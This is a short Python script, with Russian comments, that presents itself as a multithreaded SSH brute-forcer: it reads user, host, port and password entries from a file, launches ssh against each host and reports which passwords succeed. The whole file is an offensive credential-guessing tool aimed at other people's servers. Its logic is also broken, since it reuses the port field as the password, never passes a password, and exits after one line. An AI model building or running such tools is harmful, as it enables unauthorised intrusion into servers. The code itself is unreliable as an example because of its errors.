import os
import subprocess
import threading
#
#Beta maybe to do proxy

class Brutessh:

    def __init__(self,file, proxy: bool = False,) -> None:
        
        self.proxy = proxy
        self.password = []
        self.file = file

    def brute(self):
        with open(self.file,'r') as file:
            for line in file:
                parts = line.strip().split()
                ssh_command = f"ssh -p {parts[3]} {parts[0]}@{parts[1]}"
                subprocess.run(ssh_command)
                result = subprocess.run(ssh_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                if result.returncode == 0:
                    return self.password.append(f"\nПароль {parts[3]} для {parts[0]}@{parts[1]} верный!")
                else:
                    return 'Нет верных паролей, сервера херовые'
    
    def main(self):
        threads = []
        available_threads = os.cpu_count()
        # Создаем ВСЕ ПОТОКИ чтобы наверняка
        for i in range(available_threads):
            thread = threading.Thread(target=self.brute)
            threads.append(thread)
            thread.start()  # Запускаем поток

        # Ждем завершения всех потоков
        for thread in threads:
            thread.join()
